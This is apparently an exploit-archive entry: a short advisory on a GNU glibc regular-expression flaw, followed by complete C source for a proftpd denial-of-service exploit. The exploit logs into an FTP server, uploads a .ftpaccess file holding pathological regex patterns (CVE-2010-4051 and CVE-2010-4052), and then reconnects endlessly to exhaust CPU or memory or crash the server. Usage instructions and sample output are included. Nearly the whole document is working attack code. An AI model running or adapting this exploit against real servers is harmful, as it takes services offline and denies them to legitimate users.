@@ -1,0 +1,276 @@
+source: http://www.securityfocus.com/bid/45233/info
+
+GNU glibc is prone to a denial-of-service vulnerability due to stack exhaustion.
+
+Successful exploits will allow attackers to make the affected computer unresponsive, denying service to legitimate users.
+
+This issue affects unknown versions of the glibc library. This BID will be updated when more details become available. 
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+
+/* 
+
+proftpd multiple exploit for VU#912279 (only with GNU libc/regcomp(3))
+by Maksymilian Arciemowicz
+
+References:
+http://www.kb.cert.org/vuls/id/912279
+http://cxib.net/
+http://securityreason.com/
+
+Tested: 
+Ubuntu + proftpd
+
+This exploit need writing privileges to create .ftpaccess file with vulnerable regular expressions. Works well only under Linux
+
+172.16.124.1 - NetBSD 5.1 (HACKER)
+172.16.124.134 - Ubuntu 10.10 (TARGET)
+
+PoC1:
+.exitcx@cx64:~/advs/done$ ./reg1 172.16.124.134 21 cx password 172.16.124.1 1
+
+Try create .ftpaccess with HideFiles "(\.ftpaccess|(.*{10,}{10,}{10,}{10,}))$"
+...
+send: stat .
+
+send: USER cx
+PASS password
+
+send: stat .
+
+Can`t connect
+.exit
+cx@cx64:~/advs/done$ telnet 172.16.124.134 21
+Trying 172.16.124.134...
+telnet: Unable to connect to remote host: Connection refused
+
+Resume: 
+- created .ftpaccess file, and connect<=>disconnect
+It will create a lot of proftpd children with 100% CPU usage.
+
+
+If we try
+
+./reg1 172.16.124.134 21 cx password 172.16.124.1 3
+
+any proftpd children will generate memory exhausion
+
+Options:
+1 - cpu resource exhausion
+2 - crash (recursion)
+3 - memory resource exhausion
+4 - possible crash with (ulimit {-v|-m})
+
+*/
+
+
+char expl0[]="HideFiles \"(\\.ftpaccess|(.*{10,}{10,}{10,}{10,}))$\"";  //CVE-2010-4052 Long execution
+char expl1[]="HideFiles \"(\\.ftpaccess|(.*{10,}{10,}{10,}{10,}{10,}))$\""; //CVE-2010-4051 Crash
+char expl2[]="HideFiles \"(.*+++++++++++++++++++++++++++++(\\w+))\""; // memory exhausion
+char expl3[]="HideFiles \"(.*++++++++++++++++++++++++++++++(\\w+))\""; // if virtual memory limited, crash
+
+int sendftp(int stream,char *what){
+        if(-1==send(stream,what,strlen(what),0))
+                printf("Can't send %s\n",what);
+        else
+                printf("send: %s\n",what);
+
+        bzero(what,sizeof(what));
+}
+
+void readftp(int stream,int flag){
+	if(flag==1) flag=MSG_DONTWAIT;
+	else flag=0;
+        char *readline=malloc(sizeof(char)*(4096+1));
+	memset(readline,'\x00',(4096+1));
+        if(recv(stream,readline,4096,flag)<1){
+                printf("Can't read from stream\n");
+		if(readline) free(readline);
+		close(stream);
+		exit(1);
+	}
+	else{
+		if(readline)
+			write(1, readline, strlen(readline));
+		fflush(stdout);
+	}
+	free(readline);
+}
+
+
+int attack(host,port,login,pass)
+char *host,*port,*login,*pass;
+{
+	char buffer[1024]; // send ftp command buffor
+	int sockfd,n,error;
+	struct addrinfo hints;
+	struct addrinfo *res, *res0;
+
+	memset(&hints, 0, sizeof(hints));
+	hints.ai_family = PF_UNSPEC;
+	hints.ai_socktype = SOCK_STREAM;
+	error = getaddrinfo(host,port,&hints,&res0);
+
+	if (error){
+		errorcon:
+		printf("Can`t connect\n.exit");
+		exit(1);
+	}
+
+	if((sockfd=socket(res0->ai_family,res0->ai_socktype,res0->ai_protocol))<0) goto errorcon;
+	if(-1==connect(sockfd,res0->ai_addr,res0->ai_addrlen)) goto errorcon;
+
+	snprintf(buffer,1024,"USER %s\nPASS %s\n",login,pass);
+	sendftp(sockfd,buffer);
+
+	bzero(buffer,1024);
+	snprintf(buffer,1024,"STAT .\n");
+	sendftp(sockfd,buffer);
+	
+	freeaddrinfo(res0);
+	close(sockfd);
+}
+
+void exploreip(char *ip, int (*ipnum)[4]){
+	char *wsk;
+	
+	wsk=(char *)strtok(ip,".");
+	(*ipnum)[0]=atoi(wsk);
+	wsk=(char *)strtok(NULL,".");
+	(*ipnum)[1]=atoi(wsk);
+	wsk=(char *)strtok(NULL,".");
+	(*ipnum)[2]=atoi(wsk);
+	wsk=(char *)strtok(NULL,".");
+	(*ipnum)[3]=atoi(wsk);
+}
+
+
+int createexpl(host,port,login,pass,lip,pattern)
+        char *host,*port,*login,*pass,*lip,*pattern;
+{
+        char buffer[1024]; // send ftp command buffor
+        int ipnum[4];
+
+        int sockfd,n,error,sendstream,binarystream,sendport = (1024 + getpid());
+
+	struct addrinfo hints;
+	struct addrinfo *res, *res0;
+	struct sockaddr_in remo, loca;
+
+	int len = sizeof(remo);
+	
+        memset(&hints, 0, sizeof(hints));
+        hints.ai_family = PF_UNSPEC;
+        hints.ai_socktype = SOCK_STREAM;
+        error = getaddrinfo(host,port,&hints,&res0);
+
+        if (error){
+                errorcon:
+		
+		if(sendstream) close(sendstream);
+		printf("Can`t connect\n.exit");
+                exit(1);
+        }
+
+        if((sockfd=socket(res0->ai_family,res0->ai_socktype, res0->ai_protocol))<0)     goto errorcon;
+        if(-1==connect(sockfd,res0->ai_addr,res0->ai_addrlen)) goto errorcon;
+
+        readftp(sockfd,1024);
+        snprintf(buffer,1024,"USER %s\nPASS %s\n",login,pass);
+        sendftp(sockfd,buffer);
+        readftp(sockfd,1024);
+	readftp(sockfd,1024);
+
+	exploreip(lip,&ipnum);
+        snprintf(buffer,1024,"TYPE I\nPORT %d,%d,%d,%d,%d,%d\n",ipnum[0],ipnum[1],ipnum[2],ipnum[3],sendport/256,sendport%256);
+        sendftp(sockfd,buffer);
+        readftp(sockfd,1024);
+	
+	bzero(&loca, sizeof(loca));
+	loca.sin_family = AF_INET;
+	loca.sin_port=htons(sendport);
+	loca.sin_addr.s_addr = htonl(INADDR_ANY);
+
+	if((sendstream=socket(AF_INET, SOCK_STREAM,0))<0) goto errorcon;
+	if((bind(sendstream, (struct sockaddr *) &loca, sizeof(loca)))<0) goto errorcon;
+	if(listen(sendstream, 10) < 0) goto errorcon;
+
+	snprintf(buffer,1024,"STOR .ftpaccess\n");
+        sendftp(sockfd,buffer);
+	
+        readftp(sockfd,1024);
+
+	if((binarystream=accept(sendstream,(struct sockaddr *)&remo,&len)) < 0) goto errorcon;
+	write(binarystream,pattern,strlen(pattern));
+	
+	freeaddrinfo(res0);
+	close(sendstream);
+	printf("Created .ftpaccess file with %s\nIt`s time to attack...\n",pattern);
+	sleep(3);
+	
+	return 0;
+}
+
+void usage(){
+	printf("Use: ./exploit target_ip port username password [your_ip] [option]\n\nCreate .ftpaccess with selected attack\noptions:\n1 - Long execution CVE-2010-4052\n2 - Recursion Crash CVE-2010-4051\n3 - Memory exhausion \n4 - Crash if virtual memory limited\n\n");
+	exit(1);
+}
+
+int main(int argc,char *argv[])
+{
+
+        char *login,*pass,*lip=NULL;
+        char logindef[]="anonymous",passdef[]="cx@127.0.0.1";
+
+        printf("This is exploit for ERE (GNU libc)\nby Maksymilian Arciemowicz\n\n");
+
+        if(argc<3) usage();
+
+        char *host=argv[1];
+        char *port=argv[2];
+
+        if(4<=argc) login=argv[3];
+        else login=logindef;
+
+        if(5<=argc) pass=argv[4];
+        else pass=passdef;
+
+	if(6<=argc) lip=argv[5];
+	
+	if(7<=argc) switch(atoi(argv[6])){
+		case 1:
+			printf("Try create .ftpaccess with %s\n\n",expl0); 
+			createexpl(host,port,login,pass,lip,expl0);
+		break;
+		
+		case 2:
+			printf("Try create .ftpaccess with %s\n\n",expl1);
+			createexpl(host,port,login,pass,lip,expl1);
+		break;
+		
+		case 3:
+			printf("Try create .ftpaccess with %s\n\n",expl2);
+			createexpl(host,port,login,pass,lip,expl2);
+		break;
+		
+		case 4:
+			printf("Try create .ftpaccess with %s\n\n",expl3);
+			createexpl(host,port,login,pass,lip,expl3);
+		break;
+		
+		default:
+			usage();
+		break;
+	};
+
+	while(1) attack(host,port,login,pass);
+	
+        return 0; // never happen
+}
+
